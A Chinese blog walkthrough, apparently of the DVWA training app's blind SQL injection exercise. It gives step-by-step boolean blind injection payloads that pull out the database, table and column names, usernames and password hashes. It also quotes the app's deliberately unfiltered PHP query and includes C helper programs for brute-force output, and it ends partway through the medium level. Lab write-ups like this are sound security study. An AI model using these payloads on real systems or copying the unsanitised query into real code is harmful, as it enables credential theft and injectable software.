@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQL blind盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。盲注分为三类：基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。 low我们来做low级别的题从1开始输入一直到6会告诉我们不存在这个userid这个页面的功能就是告诉我">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dvwa-blind">
+<meta property="og:url" content="http://example.com/dvwa-blind/dvwa-blind.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="SQL blind盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。盲注分为三类：基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。 low我们来做low级别的题从1开始输入一直到6会告诉我们不存在这个userid这个页面的功能就是告诉我">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/1.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/2.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/3.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/5.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/6.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/7.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/8.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/9.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/10.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/11.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/12.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/13.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/14.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/15.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/16.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/17.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/18.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/19.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/20.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/21.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/22.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/23.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/24.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/25.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/26.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/27.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/28.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/29.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/30.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/31.png">
+<meta property="og:image" content="http://example.com/dvwa-blind/dvwa-blind/32.png">
+<meta property="article:published_time" content="2021-02-04T03:52:13.000Z">
+<meta property="article:modified_time" content="2021-02-07T05:17:30.650Z">
+<meta property="article:author" content="ziyuexi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/dvwa-blind/dvwa-blind/1.png">
+
+<link rel="canonical" href="http://example.com/dvwa-blind/dvwa-blind">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>dvwa-blind | blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">dvwa-blind
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <h1 id="SQL-blind"><a href="#SQL-blind" class="headerlink" title="SQL blind"></a>SQL blind</h1><p>盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。盲注分为三类：基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><img src="/dvwa-blind/dvwa-blind/1.png" alt="tcp"><br>我们来做low级别的题<br><img src="/dvwa-blind/dvwa-blind/2.png" alt="tcp"><br>从1开始输入一直到6会告诉我们不存在这个userid这个页面的功能就是告诉我们用户名是否存在<br><img src="/dvwa-blind/dvwa-blind/3.png" alt="tcp"><br>当输入1’时会告诉我们不存在所以我们可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(database()) &#x3D; ?</span><br></pre></td></tr></table></figure>
+<p>来猜数据库名字有多长比如数据库叫blind那么长度就是5而回显的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure>
+<p>则会告诉我们猜的对不对<br>命令间用and来连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&#x3D;2 #</span><br></pre></td></tr></table></figure>
+<p>and是如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。<br>而使用#是为了注释掉后面的引号<br>当我们一直试到4时系统告诉我们成功了<br><img src="/dvwa-blind/dvwa-blind/5.png" alt="tcp"><br>接下来我们使用2分法来查询acsii表然后判断数据库的名字我们会用到这个命令</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;100# </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>语法：substr(string,start,length)<br>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始</p>
+</blockquote>
+<p>接下来我们在按照ascii表来进行排查<br><img src="/dvwa-blind/dvwa-blind/6.png" alt="tcp"><br>我们照着表将其分为两个部分</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;70 # </span><br></pre></td></tr></table></figure>
+
+<p><img src="/dvwa-blind/dvwa-blind/7.png" alt="tcp"><br>我们知道数据库名字第一个字母并不在ascii表中小于70（十进制）的位置那么我们继续</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;106 # </span><br></pre></td></tr></table></figure>
+<p>不在106以上的位置</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;90 # </span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/8.png" alt="tcp"><br>可知在90到106的位置<br>经过一步步缩小范围可知</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))=100<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>也就是ascii表中第100位是d<br>当然我们也可以用一份字典来爆破出名字<br><img src="/dvwa-blind/dvwa-blind/9.png" alt="tcp"><br>然后放入我们特制的字典</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    FILE *fpwrite=fopen(<span class="string">&quot;ascii.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(y = <span class="number">32</span>;y &lt;= <span class="number">126</span>;y++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fpwrite,<span class="string">&quot;%d\n&quot;</span>,y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/10.png" alt="tcp"><br>依旧可以爆破出我们想要的东西，这样就能大大减少我们的时间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),2,1))=100<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>通过改变substr函数第二个变量我们可以不断尝试四位字母，当然我们可以连续爆破出这四位<br><img src="/dvwa-blind/dvwa-blind/11.png" alt="tcp"><br>对应的ascii表中就是dvwa<br>接下来我们来猜数据库中表的个数<br>使用这个命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span>)=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>依旧是改变等号后面的数字，当我们放到2时回显出正确结果可知数据库中有两个表<br>然后我们猜第一个表名字的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>依旧改变等号后面的数字当到9时回显正确证明有9个字母然后我们爆破出名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/12.png" alt="tcp"><br>可知名字为guestbook然后我们来猜第二个表的字母个数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>一直测试到5回显成功然后爆破字母</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/13.png" alt="tcp"><br>可知名字为users然后我们要知道users里有多少列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;users&#x27;</span>)=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>一直增加等号后面的数值，直到11回显成功之后我们直接来爆破第一列的名字<br>针对爆破我写了一个C语言的程序直接把我们输出的ascii表的十进制转化为对应的字符<br><img src="/dvwa-blind/dvwa-blind/14.png" alt="tcp"><br>直接复制粘贴进输入文本<br><img src="/dvwa-blind/dvwa-blind/15.png" alt="tcp"><br>然后启动程序得到结果<br><img src="/dvwa-blind/dvwa-blind/16.png" alt="tcp"><br>程序源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN sizeof(struct node)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">int</span> request;</span><br><span class="line">   <span class="keyword">int</span> payload1;</span><br><span class="line">   <span class="keyword">int</span> payload2;</span><br><span class="line">   <span class="keyword">int</span> status;</span><br><span class="line">   <span class="keyword">char</span> error[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">char</span> timeout[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">int</span> length;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpRead=fopen(<span class="string">&quot;number.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    FILE *fpwrite=fopen(<span class="string">&quot;answer.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span>,*<span class="title">p1</span>,*<span class="title">p2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    p1 = p2 = (struct node *)<span class="built_in">malloc</span>(LEN);</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fpRead,<span class="string">&quot;%d %d %d %d %s %s %d&quot;</span>,&amp;p1 -&gt; request,&amp;p1 -&gt; payload1,&amp;p1 -&gt; payload2,&amp;p1 -&gt; status,&amp;p1 -&gt; error,&amp;p1 -&gt; timeout,&amp;p1 -&gt; length);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            head = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 -&gt; next = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        p2 = p1;</span><br><span class="line">        p1 = (struct node *)<span class="built_in">malloc</span>(LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    p2 -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> payload2_1;</span><br><span class="line">    <span class="keyword">int</span> payload1_1;</span><br><span class="line">    <span class="keyword">for</span>(p1 = head;p1 != <span class="literal">NULL</span>;p1 = p1 -&gt; next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(p2 = p1;p2 != <span class="literal">NULL</span>;p2 = p2 -&gt; next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p1 -&gt; payload1 &gt; p2 -&gt; payload1)</span><br><span class="line">            &#123;</span><br><span class="line">                payload2_1 = p1 -&gt; payload2;</span><br><span class="line">                p1 -&gt; payload2 = p2 -&gt; payload2;</span><br><span class="line">                p2 -&gt; payload2 = payload2_1;</span><br><span class="line"></span><br><span class="line">                payload1_1 = p1 -&gt; payload1;</span><br><span class="line">                p1 -&gt; payload1 = p2 -&gt; payload1;</span><br><span class="line">                p2 -&gt; payload1 = payload1_1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(p1 = head;p1!=<span class="literal">NULL</span>;p1 = p1 -&gt; next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fpwrite,<span class="string">&quot;%c&quot;</span>,p1 -&gt; payload2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;finish!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后我们继续爆破第二列第三列一直到第十一列，找到我们要的user和password之后我们继续爆破这两列下的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">user</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>来查询用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>来查询密码<br><img src="/dvwa-blind/dvwa-blind/17.png" alt="tcp"><br>得到用户名<br><img src="/dvwa-blind/dvwa-blind/18.png" alt="tcp"><br>得到MD5密码送去解密<br><img src="/dvwa-blind/dvwa-blind/19.png" alt="tcp"><br>得到密码对应的是用户名组的第一个admin</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br></pre></td></tr></table></figure>
+<p>可以看出是字符型的，对于输入没有做任何过滤但是对于回显给的信息太少了，所以对于一般的sql注入要难一些，但是整体流程还是差不多的。</p>
+<hr>
+
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><img src="/dvwa-blind/dvwa-blind/20.png" alt="tcp"><br>我们来到了medium难度变成了前端的下拉式菜单，我们只需要抓包修改ID即可<br><img src="/dvwa-blind/dvwa-blind/21.png" alt="tcp"><br>仅仅需要修改ID后面的参数即可我们可以来试一试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/22.png" alt="tcp"><br>显示并没有，那么我们修改下再试一试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/23.png" alt="tcp"><br>这会显示存在了，那么我们所有的命令都不需要引号了,输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length(database())&#x3D;4 #</span><br></pre></td></tr></table></figure>
+<p>来查询数据库的名字<br>继续来爆破名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&#x3D;100# </span><br></pre></td></tr></table></figure>
